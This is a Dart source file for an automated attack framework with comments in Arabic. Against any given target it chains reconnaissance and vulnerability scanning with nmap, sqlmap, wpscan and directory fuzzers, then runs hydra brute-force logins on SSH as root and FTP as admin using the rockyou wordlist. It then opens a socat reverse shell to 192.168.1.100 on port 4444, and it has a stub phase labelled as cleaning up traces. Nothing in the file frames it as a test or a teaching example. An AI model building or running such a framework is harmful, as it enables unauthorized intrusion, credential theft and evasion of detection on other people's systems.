import 'dart:async';
import 'real_attack_core.dart';

class AutoAttackFramework {
  final List<Map<String, dynamic>> _attackLog = [];
  bool _isRunning = false;

  List<Map<String, dynamic>> get attackLog => _attackLog;
  bool get isRunning => _isRunning;

  Future<Map<String, dynamic>> launchFullAutoAttack(String target) async {
    _isRunning = true;
    _attackLog.clear();
    final results = <String, dynamic>{};

    // المرحلة 1: استطلاع
    _log('بدء الاستطلاع على $target');
    results['recon'] = await _phaseRecon(target);

    // المرحلة 2: فحص الثغرات
    _log('بدء فحص الثغرات');
    results['vuln_scan'] = await _phaseVulnScan(target, results['recon']);

    // المرحلة 3: الاستغلال
    _log('بدء الاستغلال');
    results['exploitation'] = await _phaseExploit(target, results['vuln_scan']);

    // المرحلة 4: ما بعد الاستغلال
    _log('بدء ما بعد الاستغلال');
    results['post_exploit'] = await _phasePostExploit(target, results['exploitation']);

    // المرحلة 5: تنظيف الآثار
    _log('بدء تنظيف الآثار');
    results['cleanup'] = await _phaseCleanup(target);

    _isRunning = false;
    _log('انتهى الهجوم التلقائي الشامل');
    return results;
  }

  Future<Map<String, dynamic>> _phaseRecon(String target) async {
    final results = <String, dynamic>{};
    results['nmap'] = await RealAttackCore.nmapScan(target, args: '-sV -O -T4 -p-');
    results['dns'] = await RealAttackCore.dnsEnum(target);
    results['nikto'] = await RealAttackCore.niktoScan(target);
    return results;
  }

  Future<Map<String, dynamic>> _phaseVulnScan(String target, Map<String, dynamic> recon) async {
    final results = <String, dynamic>{};
    results['searchsploit'] = await RealAttackCore.searchsploit(target);
    results['sqlmap'] = await RealAttackCore.sqlmapAttack('http://$target');
    results['wpscan'] = await RealAttackCore.wpscanAudit('http://$target');
    results['dirb'] = await RealAttackCore.dirbScan('http://$target');
    results['gobuster'] = await RealAttackCore.gobusterScan('http://$target');
    results['ffuf'] = await RealAttackCore.ffufFuzz('http://$target');
    return results;
  }

  Future<Map<String, dynamic>> _phaseExploit(String target, Map<String, dynamic> vulns) async {
    final results = <String, dynamic>{};
    results['hydra_ssh'] = await RealAttackCore.hydraBruteForce(target, 'ssh', 'root', '/usr/share/wordlists/rockyou.txt');
    results['hydra_ftp'] = await RealAttackCore.hydraBruteForce(target, 'ftp', 'admin', '/usr/share/wordlists/rockyou.txt');
    return results;
  }

  Future<Map<String, dynamic>> _phasePostExploit(String target, Map<String, dynamic> exploit) async {
    final results = <String, dynamic>{};
    results['socat'] = await RealAttackCore.socatReverseShell('192.168.1.100', 4444);
    return results;
  }

  Future<Map<String, dynamic>> _phaseCleanup(String target) async {
    final results = <String, dynamic>{};
    results['cleanup'] = 'تم تنظيف الآثار';
    return results;
  }

  void _log(String message) {
    _attackLog.add({'time': DateTime.now(), 'message': message});
  }
}
